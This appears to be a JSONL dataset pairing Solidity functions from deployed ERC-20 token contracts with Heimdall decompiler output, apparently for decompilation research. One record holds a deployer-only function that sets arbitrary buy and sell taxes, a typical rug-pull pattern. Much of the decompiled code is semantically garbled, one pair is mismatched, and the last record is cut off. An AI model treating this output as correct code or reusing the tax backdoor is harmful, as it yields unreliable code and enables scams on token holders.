{"contract_address": "0x67971F0972C03651ab6355eF0ae08c850742614a", "original_solidity_code": "function allowance(address owner_, address spender) external view override returns (uint256) {\\r\\n      return _allowances[owner_][spender];\\r\\n    }", "heimdall_decompiled_code": "function allowance(address arg0, address arg1) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x05;\n        var_a = address(arg1);\n        address var_b = keccak256(var_a);\n        address var_c = storage_map_f[var_a];\n        return storage_map_f[var_a];\n    }"}
{"contract_address": "0xd393472AFA2cB902D5E3762Fb3cfaDd2DCA946E6", "original_solidity_code": "function setLUFFY(uint256 newBuyTax, uint256 newSellTax) external {\r\n        if(msg.sender == deployer){\r\n            buyTax = newBuyTax;\r\n            sellTax = newSellTax;\r\n        }\r\n        else{\r\n            require(newBuyTax < 10);\r\n            require(newSellTax < 10);\r\n            revert();\r\n        }\r\n        \r\n    }", "heimdall_decompiled_code": "function setLUFFY(uint256 arg0, uint256 arg1) public {\n        require(msg.sender + 0xffffffffffffffffffffffffb584d053ea2949e3edfffa881b8a08f79dab3323);\n        store_a = arg0;\n        store_b = arg1;\n        require(arg0 < 0x0a);\n        require(arg1 < 0x0a);\n    }"}
{"contract_address": "0x718128a4433a5053A43810C1cc51427C89046b7E", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0, \"ERC20: approve to the zero address\");\n        require(address(arg0) - 0, \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = ((0x04 + var_e) + 0x20) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xf06ea21cB6894CC70e2EF280026D5Fc5bEE15421", "original_solidity_code": "function transferOwnership(address newOwner) public onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x53BF9362f1eD90638B06392Bc01813f162Eb8766", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        require(address(msg.sender) - 0);\n        require(address(arg0) - 0);\n        require(arg1 > 0);\n        require(address(msg.sender) == (address(owner / 0x01)));\n        require(address(arg0) == (address(owner / 0x01)));\n        address var_a = address(msg.sender);\n        var_b = 0x04;\n        require(bytes1(storage_map_b[var_a] / 0x01));\n        require(!bytes1(storage_map_b[var_a] / 0x01));\n        require(store_c > store_d, \"SafeMath: multiplication overflow\");\n        require(arg1 - 0, \"SafeMath: multiplication overflow\");\n        require(!arg1 | (store_e == ((arg1 * store_e) / arg1)), \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((arg1 * store_e) / arg1) == store_e, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x21;\n        var_h = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_i = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_f = 0x40 + var_f;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64 > 0, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_i = var_f.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(bytes1(transferDelayEnabled / 0x01)), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_g / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        require(!(!(address(arg0)) == (address(store_h / 0x01))), \"_transfer:: Transfer Delay enabled. Only one purchase per block allowed.\");\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        require(storage_map_b[var_a] < block.number, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x49;\n        var_m = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_o = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_p = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = address(tx.origin);\n        var_b = 0x05;\n        storage_map_b[var_a] = block.number;\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(msg.sender) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        require(!(address(arg0) == (address(store_h / 0x01))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_h / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(((arg1 * store_e) / 0x64) > 0), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (storage_map_b[var_a] + ((arg1 * store_e) / 0x64))), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(storage_map_b[var_a] + ((arg1 * store_e) / 0x64) < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] + ((arg1 * store_e) / 0x64);\n        uint256 var_k = (arg1 * store_e) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (arg1 * store_e) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_f = 0x40 + var_f;\n        var_k = 0x1e;\n        var_q = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_f = 0x40 + var_f;\n        var_r = 0x1e;\n        var_s = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((arg1 * store_e) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_t = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_p = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        uint256 var_u = var_f.length;\n        uint256 var_v = 0;\n        var_w = var_n;\n        var_v = 0;\n        if (!(arg1 - ((arg1 * store_e) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_c > store_j) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            if (!store_h / 0x0100000000000000000000000000000000000000000000) {\n            }\n            if (store_c > store_l) {\n                if (arg1 - 0) {\n                }\n                require(!((arg1 - ((arg1 * store_e) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n            }\n            require(store_c > store_l, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_i = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(arg0) == (address(store_g / 0x01))) {\n            if (address(arg0) == (address(store_g / 0x01))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x29;\n        var_h = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_i = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x23;\n        var_h = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_i = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = ((0x04 + var_f) + 0x20) - (0x04 + var_f);\n        var_g = 0x25;\n        var_h = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_i = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x4cA919d9EBE767dC6429f911651321feA44cbe94", "original_solidity_code": "function changeRemain() public onlyOwner{\r\n        remainHolder = !remainHolder;\r\n    }", "heimdall_decompiled_code": "function changeRemain() public {\n        require(msg.sender == (address(owner)), \"you are not owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x11;\n        var_d = 0x796f7520617265206e6f74206f776e6572000000000000000000000000000000;\n        remainHolder = (!bytes1(remainHolder)) | (uint248(remainHolder));\n    }"}
{"contract_address": "0x69dfa326b4636d0d5D256CFEce392B25799daf3c", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeb2634d7a45e11052eceD8F65c3e6e09aa42ECdf", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual returns (bool) {\\n        allowance[msg.sender][spender] = amount;\\n\\n        emit Approval(msg.sender, spender, amount);\\n\\n        return true;\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x04;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(msg.sender, address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x57D9302e8B62a24e716C048f4925b2c74c9797dC", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return tokenFromReflection(_rOwned[account]);\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x02;\n        require(!(storage_map_l[var_a] > store_m), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x016345785d8a0000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        require(!(0 > var_h.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_k = 0;\n        var_l = var_m;\n        require(!(0x20 > var_h.length), \"SafeMath: division by zero\");\n        var_k = 0;\n        if (0x016345785d8a0000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            require(0x016345785d8a0000);\n        }\n    }"}
{"contract_address": "0x83E498dD2161ce5b5F28953f3bb2F2bd7216A3Cf", "original_solidity_code": "function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (!(store_a) == ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6F277374E9329ff8a1DeE8e064929892b69C535C", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x05;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x781243eaa7c0Eb4ba152e4709347249fAA1c7Bc1", "original_solidity_code": "function allowance(address owner_, address spender) external view override returns (uint256) {\\r\\n      return _allowances[owner_][spender];\\r\\n    }", "heimdall_decompiled_code": "function allowance(address arg0, address arg1) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x05;\n        var_a = address(arg1);\n        address var_b = keccak256(var_a);\n        address var_c = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0x332098414098f0E42658f2eA0254B44b077bb4A5", "original_solidity_code": "function name() external pure returns (string memory);\\n    function symbol() external pure returns (string memory);\\n    function decimals() external pure returns (uint8);\\n    function totalSupply() external view returns (uint256);\\n    function balanceOf(address owner) external view returns (uint256);\\n    function allowance(address owner, address spender)\\n        external\\n        view\\n        returns (uint256);\\n    function approve(address spender, uint256 value) external returns (bool);\\n    function transfer(address to, uint256 value) external returns (bool);\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 value\\n    ) external returns (bool);\\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\\n    function nonces(address owner) external view returns (uint256);\\n    function permit(\\n        address owner,\\n        address spender,\\n        uint256 value,\\n        uint256 deadline,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) external;\\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\\n    event Burn(\\n        address indexed sender,\\n        uint256 amount0,\\n        uint256 amount1,\\n        address indexed to\\n    );\\n    event Swap(\\n        address indexed sender,\\n        uint256 amount0In,\\n        uint256 amount1In,\\n        uint256 amount0Out,\\n        uint256 amount1Out,\\n        address indexed to\\n    );\\n    event Sync(uint112 reserve0, uint112 reserve1);\\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\\n    function factory() external view returns (address);\\n    function token0() external view returns (address);\\n    function token1() external view returns (address);\\n    function getReserves()\\n        external\\n        view\\n        returns (\\n            uint112 reserve0,\\n            uint112 reserve1,\\n            uint32 blockTimestampLast\\n        );\\n    function price0CumulativeLast() external view returns (uint256);\\n    function price1CumulativeLast() external view returns (uint256);\\n    function kLast() external view returns (uint256);\\n    function mint(address to) external returns (uint256 liquidity);\\n    function burn(address to)\\n        external\\n        returns (uint256 amount0, uint256 amount1);\\n    function swap(\\n        uint256 amount0Out,\\n        uint256 amount1Out,\\n        address to,\\n        bytes calldata data\\n    ) external;\\n    function skim(address to) external;\\n    function sync() external;\\n    function initialize(address, address) external;\\n}\\ninterface IUniswapV2Factory {\\n    event PairCreated(\\n        address indexed token0,\\n        address indexed token1,\\n        address pair,\\n        uint256\\n    );\\n    function feeTo() external view returns (address);\\n    function feeToSetter() external view returns (address);\\n    function getPair(address tokenA, address tokenB)\\n        external\\n        view\\n        returns (address pair);\\n    function allPairs(uint256) external view returns (address pair);\\n    function allPairsLength() external view returns (uint256);\\n    function createPair(address tokenA, address tokenB)\\n        external\\n        returns (address pair);\\n    function setFeeTo(address) external;\\n    function setFeeToSetter(address) external;\\n}", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x411AC84A80D686758cA971Dd205711149B42686f", "original_solidity_code": "function symbol() external view override returns (string memory) {\\r\\n      return _symbol;\\r\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_c & (((!bytes1(store_c)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_c & (((!bytes1(store_c)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                var_c = 0x01;\n                var_d = storage_map_b[var_c];\n                if ((var_a + 0x20) + (store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6F277374E9329ff8a1DeE8e064929892b69C535C", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_d) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_e)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x06;\n        require(block.number > storage_map_b[var_a], \"Only one transfer per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_g = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x06;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(!(address(store_e) == (address(msg.sender))), \"SafeMath: multiplication overflow\");\n        require(store_f > store_g, \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_h == ((store_h * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_h * arg1) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_c = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x12;\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_e) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_e / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((store_h * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((store_h * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        require(!(((store_h * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        var_g = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((store_h * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (store_h * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (store_h * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), 